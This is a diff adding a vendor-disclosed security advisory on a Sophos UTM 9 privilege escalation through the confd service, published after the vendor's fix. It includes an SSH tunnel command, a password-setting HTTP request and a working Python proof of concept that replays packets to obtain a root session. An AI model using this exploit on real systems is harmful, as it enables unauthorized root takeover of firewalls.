@@ -1,0 +1,183 @@
+KL-001-2018-007 : Sophos UTM 9 loginuser Privilege Escalation via confd Service
+
+Title: Sophos UTM 9 loginuser Privilege Escalation via confd Service
+Advisory ID: KL-001-2018-007
+Publication Date: 2018.03.02
+Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2018-007.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Sophos
+     Affected Product: UTM 9
+     Affected Version: 9.410
+     Platform: Embedded Linux
+     CWE Classification: CWE-306: Missing Authentication for Critical Function (SID generation)
+     Impact: Privilege Escalation
+     Attack vector: SSH
+
+2. Vulnerability Description
+
+     The attacker must know the password for the loginuser
+     account. The confd client is not available to the loginuser
+     account. However, the running service is accessible over
+     a network port on the loopback interface. By replaying the
+     network traffic required to obtain a SID from this service it
+     is possible to escalate privileges to root.
+
+3. Technical Description
+
+     1. Obtain the a privileged session token
+
+     $ ssh -Nf -L 127.0.0.1:4472:127.0.0.1:4472 loginuser@1.3.3.7
+     loginuser@1.3.3.7's password:
+     $ python kl-loginuser-confd-priv_esc.py
+     pojiZSqWEUAUDNIQtSop
+
+     2. Using that session token, set the root password
+
+     POST /webadmin.plx HTTP/1.1
+     Host: 1.3.3.7:4444
+     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0
+     Accept: text/javascript, text/html, application/xml, text/xml, */*
+     Accept-Language: en-US,en;q=0.5
+     X-Requested-With: XMLHttpRequest
+     X-Prototype-Version: 1.5.1.1
+     Content-Type: application/json; charset=UTF-8
+     Referer: https://1.3.3.7:4444/
+     Content-Length: 422
+     Cookie: SID=pojiZSqWEUAUDNIQtSop
+     DNT: 1
+     Connection: close
+
+     {"objs": [{"ack": null, "elements": {"root_pw_1": "korelogic", "root_pw_2": "korelogic", "loginuser_pw_1":
+"loginuser", "loginuser_pw_2": "loginuser"}, "FID": "system_settings_shell"}], "SID": "pojiZSqWEUAUDNIQtSop", "browser":
+"gecko", "backend_version": "2", "loc": "english", "_cookie": null, "wdebug": 0, "RID":
+"1490305723111_0.8089407793028881", "current_uuid": "2844879a-e014-11da-b3ae-0014221e9eba", "ipv6": false}
+
+     HTTP/1.1 200 OK
+     Date: Thu, 23 Mar 2017 15:33:53 GMT
+     Server: Apache
+     Expires: Thursday, 01-Jan-1970 00:00:01 GMT
+     Pragma: no-cache
+     X-Frame-Options: SAMEORIGIN
+     X-Content-Type-Option: nosniff
+     X-XSS-Protection: 1; mode=block
+     Vary: Accept-Encoding
+     Connection: close
+     Content-Type: application/json; charset=utf-8
+     Content-Length: 178895
+
+     {"SID":"pojiZSqWEUAUDNIQtSop","ipv6":false,"current_uuid":"2844879a-e014-11da-b3ae-0014221e9eba",[snip over 9000]
+
+     3. Look for success message.
+
+     "objs":[{"success":[{"text":"Shell user password(s) set successfully."}]
+
+     4. Profit.
+
+     loginuser@[redacted]:/home/login > su
+     Password:
+     [redacted]:/home/login # id
+     uid=0(root) gid=0(root) groups=0(root),890(xorp)
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor has addressed this vulnerability in version
+     9.508. Release notes and download instructions can be found at:
+
+     https://community.sophos.com/products/unified-threat-management/b/utm-blog/posts/utm-up2date-9-508-released
+
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel)
+     of KoreLogic, Inc.
+
+6. Disclosure Timeline
+
+     2017.07.21 - KoreLogic submits vulnerability details to Sophos.
+     2017.07.21 - Sophos acknowledges receipt.
+     2017.09.01 - 30 business days have elapsed since the vulnerability
+                  was reported to Sophos.
+     2017.09.15 - KoreLogic requests an update on the status of this and
+                  other vulnerabilities reported to Sophos.
+     2017.09.18 - Sophos informs KoreLogic that this issue will require
+                  additional engineering and requests an extension of
+                  the disclosure timeline.
+     2017.09.25 - 45 business days have elapsed since the vulnerability
+                  was reported to Sophos.
+     2017.11.07 - 75 business days have elapsed since the vulnerability
+                  was reported to Sophos.
+     2017.12.14 - 100 business days have elapsed since the vulnerability
+                  was reported to Sophos.
+     2018.01.12 - KoreLogic requests an update from Sophos.
+     2018.01.15 - Sophos informs KoreLogic that the expected release date
+                  for the UTM 9.5 MR 6 version containing the mitigation
+                  is the middle of February.
+     2018.01.16 - 120 business days have elapsed since the vulnerability
+                  was reported to Sophos.
+     2018.02.28 - 150 business days have elapsed since the vulnerability
+                  was reported to Sophos.
+     2018.03.01 - UTM 9.508 released by Sophos.
+     2018.03.02 - KoreLogic public disclosure.
+
+7. Proof of Concept
+
+from socket import socket,AF_INET,SOCK_STREAM
+
+class Exploit:
+    def __init__(self):
+        self.host = '127.0.0.1'
+        self.port = 4472
+        self.connected = False
+        self.s = None
+        return None
+    def disconnect(self):
+        self.s.close()
+        return True
+    def send_trigger(self):
+        packet_one =
+'00000039050702000000050a0a43616c6c4d6574686f6404110b41737461726f3a3a52504303000000000a036765740a04697076360a06737461747573'.decode('hex')
+        self.s.send(packet_one)
+        self.s.recv(4096)
+        packet_two =
+'00000099050702000000040a094e657748616e646c650a037379730a036e65770403000000060a0f636f6e66642d636c69656e742e706c00000006636c69656e7417000000000870617373776f72640a093132372e302e302e31000000066173675f69700a093132372e302e302e31000000026970170673797374656d00000008757365726e616d65170673797374656d00000008666163696c697479'.decode('hex')
+        self.s.send(packet_two)
+        self.s.recv(4096)
+        packet_three =
+'0000002f05070200000003170a43616c6c4d6574686f6404110b41737461726f3a3a525043030000000017076765745f534944'.decode('hex')
+        self.s.send(packet_three)
+        print self.s.recv(4096).strip()
+        return True
+    def connect(self):
+        self.s = socket(AF_INET, SOCK_STREAM)
+        self.s.connect((self.host,self.port))
+        self.connected = True
+        return True
+    def run(self):
+        self.connect()
+        self.send_trigger()
+        self.disconnect()
+        return True
+
+if __name__=="__main__":
+    Exploit().run()
+
+
+The contents of this advisory are copyright(c) 2018
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
